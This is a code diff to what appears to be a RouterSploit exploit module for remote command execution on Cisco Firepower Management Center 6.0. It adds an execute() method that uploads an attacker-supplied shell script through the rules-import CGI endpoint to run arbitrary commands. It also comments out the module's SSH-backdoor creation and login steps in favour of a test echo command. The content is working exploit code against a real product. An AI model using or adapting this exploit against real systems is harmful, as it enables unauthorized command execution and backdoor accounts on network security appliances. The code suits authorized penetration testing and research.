--- routersploit/modules/exploits/routers/cisco/firepower_management60_rce.py
+++ routersploit/modules/exploits/routers/cisco/firepower_management60_rce.py
@@ -49,10 +49,11 @@ class Exploit(HTTPClient, SSHClient):
                 if not self.newpassword:
                     self.newpassword = utils.random_text(8)
 
-                self.create_ssh_backdoor(self.newusername, self.newpassword)
+                self.execute("echo b33f13")
+                #self.create_ssh_backdoor(self.newusername, self.newpassword)
 
-                # Log into the SSH backdoor account
-                self.init_ssh_session(self.newusername, self.newpassword)
+                ## Log into the SSH backdoor account
+                #self.init_ssh_session(self.newusername, self.newpassword)
             else:
                 print_error("Exploit failed. Could not log in")
         else:
@@ -99,6 +100,32 @@ class Exploit(HTTPClient, SSHClient):
         print_error("Exploit failed. Could not authenticate.")
         return False
 
+    def execute(self, cmd):
+        sh_name = 'exploit.sh'
+        sf_action_id = self.get_sf_action_id()
+
+        payload = "{}; rm /var/sf/SRU/{}".format(cmd, sh_name)
+
+        print_status("Attempting to exploit.sh")
+
+        multipart_form_data = {
+            "action_submit": (None, "Import"),
+            "source": (None, "file"),
+            "manual_update": (None, "1"),
+            "sf_action_id": (None, sf_action_id),
+            "file": (sh_name, payload)
+        }
+
+        self.http_request(
+            method="POST",
+            path="/DetectionPolicy/rules/rulesimport.cgi",
+            files=multipart_form_data,
+            session=self.session
+        )
+
+        return
+
+
     def create_ssh_backdoor(self, username, password):
         sh_name = 'exploit.sh'
         sf_action_id = self.get_sf_action_id()
